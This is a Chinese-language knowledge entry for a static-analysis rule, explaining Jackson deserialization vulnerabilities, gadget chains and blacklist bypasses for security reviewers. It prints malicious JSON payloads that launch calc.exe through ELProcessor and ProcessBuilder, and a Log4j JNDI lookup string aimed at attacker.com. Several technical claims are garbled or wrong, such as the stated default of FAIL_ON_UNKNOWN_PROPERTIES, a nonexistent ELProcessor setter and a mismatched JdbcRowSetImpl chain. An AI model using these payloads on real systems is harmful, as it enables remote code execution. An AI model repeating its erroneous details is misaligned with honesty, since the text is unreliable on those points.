# Java Jackson 反序列化漏洞完整描述

> 规则 ID：`pom_jacksondatabind_deserialization` · 类别：deser · 关键 sink：（cypher 结构提取，见原文）
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java Jackson 反序列化漏洞完整描述
Jackson 是 Java 生态中最主流的 JSON 解析/序列化框架之一，由 FasterXML 维护，其核心由 `jackson-databind`（数据绑定）、`jackson-core`（核心解析）、`jackson-annotations`（注解）三大模块构成。Jackson 反序列化漏洞本质是**攻击者通过构造恶意 JSON 数据，利用 Jackson 数据绑定机制触发危险类的实例化/方法调用，最终实现代码执行、权限绕过、数据泄露等恶意行为**。

以下从漏洞根源、触发条件、不同攻击场景/变种、典型利用链等维度，完整梳理该漏洞的各类情况：

## 一、漏洞核心根源
Jackson 反序列化漏洞的核心在于 `jackson-databind` 模块的**默认类型处理机制**和**多态类型解析**：
1. **默认类型序列化/反序列化**：Jackson 支持通过 `@JsonTypeInfo` 注解或全局配置 `DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES=false` + `enableDefaultTyping()`，在 JSON 中嵌入类型信息（如 `@class` 字段），反序列化时根据该字段实例化对应类；
2. **类实例化的无限制**：默认情况下，Jackson 会尝试实例化 JSON 中指定的任意类（包括 JDK 内置危险类、第三方库危险类），并通过 setter 方法/构造函数为类的属性赋值——若该类的属性赋值/实例化过程包含危险逻辑（如执行系统命令、加载恶意类），则会被攻击者利用；
3. **反序列化流程的可控性**：攻击者可通过构造 JSON 中的属性名/值，控制危险类的属性赋值顺序、参数值，触发危险方法执行。

## 二、漏洞触发的基础条件
Jackson 反序列化漏洞的触发需满足以下核心条件（不同场景下略有扩展）：
1. 项目依赖 `jackson-databind` 且版本存在漏洞（未修复危险类黑名单）；
2. 启用了**默认类型解析**（如 `ObjectMapper.enableDefaultTyping()`、`enableDefaultTypingAsProperty()`，或使用 `@JsonTypeInfo` 注解）；
3. 反序列化的目标类型为泛型（如 `Object`、`Map`、`List`）或多态类型（无明确的目标类限制）；
4. 目标环境中存在可被利用的“gadget 类”（即包含危险逻辑的类，JDK 内置或第三方依赖）；
5. `DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES` 未启用（默认值为 false，允许 Jackson 忽略未知属性，不阻断恶意字段的解析）。

## 三、不同攻击场景与变种
### 场景1：基于 JDK 内置类的利用（核心基础场景）
攻击者利用 JDK 自带的危险类，无需第三方依赖即可触发漏洞，是最经典的利用方式。

#### 1.1 `javax.el.ELProcessor` 利用链（JDK 11+ 或含 EL 依赖）
- 核心原理：`ELProcessor` 类的 `eval` 方法可执行 EL 表达式，攻击者通过反序列化时为 `ELProcessor` 的属性赋值，触发表达式执行；
- 触发条件：环境中存在 `javax.el:javax.el-api` + `org.glassfish:javax.el` 依赖，或 JDK 11+ 内置 EL 模块；
- 恶意 JSON 示例（核心片段）：
```json
["javax.el.ELProcessor", {"script": "java.lang.Runtime.getRuntime().exec(\"calc.exe\")"}]
```
- 执行流程：Jackson 解析 `@class` 指定的 `ELProcessor` → 实例化该类 → 调用 `setScript` 方法赋值 → 触发 `eval` 执行系统命令。

#### 1.2 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 利用链（JDK 内置）
- 核心原理：`TemplatesImpl` 类的 `_bytecodes` 属性可存储恶意类字节码，当调用 `newTransformer()` 时会加载并执行该字节码；
- 触发条件：需结合其他类（如 `com.sun.rowset.JdbcRowSetImpl`）触发 `TemplatesImpl` 的方法调用；
- 利用链：`JdbcRowSetImpl`（设置 `dataSourceName` 为恶意 `TemplatesImpl` 实例，`autoCommit=true`）→ 反序列化时触发 `connect()` → 调用 `TemplatesImpl.newTransformer()` → 执行恶意字节码；
- 关键限制：JDK 8u191+ 对 `TemplatesImpl` 增加了权限检查，默认环境下利用难度提升。

#### 1.3 `java.lang.ProcessBuilder` 直接利用（低版本 Jackson）
- 核心原理：低版本 Jackson（<2.8.10）未将 `ProcessBuilder` 加入黑名单，可直接通过 JSON 实例化并设置命令参数；
- 恶意 JSON 示例：
```json
{"@class":"java.lang.ProcessBuilder","command":["calc.exe"],"redirectErrorStream":true}
```
- 执行流程：实例化 `ProcessBuilder` → 赋值 `command` 属性 → 若触发 `start()` 方法（需结合其他逻辑）则执行命令。

### 场景2：基于第三方库的利用（扩展场景）
当目标项目引入特定第三方依赖时，攻击者可利用这些库中的危险类构造利用链，覆盖范围更广。

#### 2.1 Apache Commons Collections（CC 链）
- 核心原理：Apache Commons Collections（3.x/4.x）中的 `TransformedMap`、`InvokerTransformer` 等类支持动态方法调用，可构造链式调用触发任意代码执行；
- 触发条件：项目依赖 `commons-collections:commons-collections:3.2.1`（未修复版本）+ Jackson 未拉黑相关类；
- 利用逻辑：通过 Jackson 反序列化 `TransformedMap` → 触发 `transform` 方法 → 调用 `InvokerTransformer.invoke()` → 执行 `Runtime.exec()`。

#### 2.2 Spring 框架相关利用
- 核心原理：Spring 中的 `org.springframework.beans.factory.ObjectFactory`、`org.springframework.aop.framework.AdvisedSupport` 等类可被利用，结合 Jackson 类型解析触发方法调用；
- 触发条件：项目为 Spring Boot/Spring MVC 应用，依赖 `spring-beans`、`spring-aop` 等模块；
- 典型利用：通过 `AdvisedSupport` 设置 `targetSource` 为恶意 `TemplatesImpl` 实例 → 反序列化时触发 `getTarget()` → 执行恶意代码。

#### 2.3 Log4j 结合利用（非直接反序列化，但叠加风险）
- 核心逻辑：若 Jackson 反序列化时解析的字段值包含 Log4j 漏洞触发字符串（如 `${jndi:ldap://attacker.com/malicious}`），且目标环境存在 Log4j 2.x 漏洞，则可叠加触发 Log4j 远程代码执行；
- 场景特点：无需依赖 Jackson 本身的代码执行漏洞，而是利用 Jackson 解析并输出字段值的过程，触发 Log4j 的 JNDI 注入。

### 场景3：Jackson 模块扩展漏洞（如 jackson-modules-java8/jaxb）
Jackson 提供了多个扩展模块（如 `jackson-modules-java8`、`jackson-module-jaxb-annotations`），这些模块的反序列化逻辑若存在缺陷，也会引入漏洞：
- `jackson-module-jaxb-annotations`：JAXB 类型解析机制可绕过核心模块的黑名单，实例化危险类；
- `jackson-datatype-jdk8`：对 JDK8 新特性（如 `Optional`）的反序列化处理，若逻辑不当，可触发危险类的初始化。

### 场景4：黑名单绕过场景（漏洞变种核心）
Jackson 官方的修复方式主要是**维护危险类黑名单**（`blacklistClasses`），但攻击者持续发现绕过方式：
#### 4.1 类名变形绕过
- 原理：Jackson 对类名的解析支持部分模糊匹配（如忽略空格、大小写，或支持内部类的不同写法）；
- 示例：将 `javax.el.ELProcessor` 变形为 `javax.el.ELProcessor$1`（内部类写法）、`JAVAX.EL.ELPROCESSOR`（大小写），绕过简单的字符串匹配黑名单。

#### 4.2 自定义类加载器绕过
- 原理：攻击者通过反序列化自定义类加载器，加载未被拉黑的自定义类，该类包含危险逻辑；
- 条件：目标环境允许自定义类加载，且 Jackson 未限制类加载器的使用。

#### 4.3 多态类型嵌套绕过
- 原理：将危险类嵌套在合法的多态类型中（如 `List<Object>`、`Map<String, Object>`），绕过针对单一类的黑名单检查；
- 示例：
```json
{
  "@class":"java.util.ArrayList",
  "values":[
    {"@class":"javax.el.ELProcessor","script":"calc.exe"}
  ]
}
```

#### 4.4 反序列化后触发（延迟执行）
- 原理：Jackson 反序列化时未直接执行危险代码，但反序列化后的对象被业务逻辑调用（如 `toString()`、`hashCode()`），触发危险方法；
- 场景特点：漏洞触发依赖业务代码的后续操作，属于“间接利用”，难以通过单纯的反序列化拦截防范。

### 场景5：特殊配置下的漏洞（非默认配置）
Jackson 的部分非默认配置会放大反序列化风险，即使基础版本较新，也可能存在漏洞：
#### 5.1 禁用类型检查（`MapperFeature.USE_BASE_TYPE_AS_DEFAULT_IMPL`）
- 配置效果：允许将未知类型解析为基类，扩大可实例化的类范围；
- 风险：攻击者可利用基类的多态特性，实例化子类中的危险类。

#### 5.2 启用 `ACCEPT_EMPTY_STRING_AS_NULL_OBJECT`
- 配置效果：将空字符串解析为 null 对象，但逻辑不当可能导致类型解析异常，触发危险类的实例化。

#### 5.3 自定义反序列化器（Custom Deserializer）
- 风险：若业务自定义的反序列化器未做输入校验，可被攻击者利用，绕过 Jackson 内置的安全限制，直接解析恶意类。

## 四、漏洞影响范围的关键维度
1. **Jackson 版本**：
   - 2.0.x ~ 2.8.x：高危，黑名单覆盖不全，大量 JDK/第三方类可被利用；
   - 2.9.x ~ 2.10.x：修复部分黑名单，但仍存在绕过方式；
   - 2.11.x+：强化类型检查，默认禁用 `enableDefaultTyping()`，漏洞利用难度大幅提升，但非完全免疫。
2. **JDK 版本**：
   - JDK 7/8（<8u191）：内置类利用链最丰富，易触发；
   - JDK 9+：模块化设计+权限限制，部分利用链失效，但仍有 ELProcessor 等新利用点；
3. **依赖环境**：第三方库（如 Commons Collections、Spring、Log4j）的存在与否，直接决定扩展利用链是否可用。

## 五、漏洞的典型危害
1. **远程代码执行（RCE）**：核心危害，攻击者可执行任意系统命令，控制服务器；
2. **数据泄露**：利用危险类读取服务器敏感文件（如 `/etc/passwd`、`application.yml`）；
3. **权限绕过**：触发权限校验类的逻辑漏洞，提升自身权限；
4. **拒绝服务（DoS）**：实例化大量资源消耗类（如 `java.util.HashMap` 构造循环引用），导致服务器内存/CPU 耗尽。

## 六、关键区别：Jackson 反序列化 vs 其他反序列化漏洞
Jackson 反序列化漏洞与 Fastjson、Gson 等框架的核心区别：
1. **触发前提**：Jackson 需显式启用默认类型解析（`enableDefaultTyping()`），而 Fastjson 默认支持类型解析（`@type` 字段）；
2. **利用链**：Jackson 更依赖“属性赋值触发方法调用”，而 Fastjson 更依赖“类初始化/构造函数执行”；
3. **修复方式**：Jackson 以“黑名单+禁用默认类型”为主，Fastjson 以“白名单+沙箱”为主。

综上，Jackson 反序列化漏洞的本质是“类型解析的无限制”与“危险类的可利用性”结合的产物，其攻击场景覆盖 JDK 内置类、第三方库、配置绕过等多个维度，且随着 Jackson 版本和依赖环境的变化，利用方式持续演变。

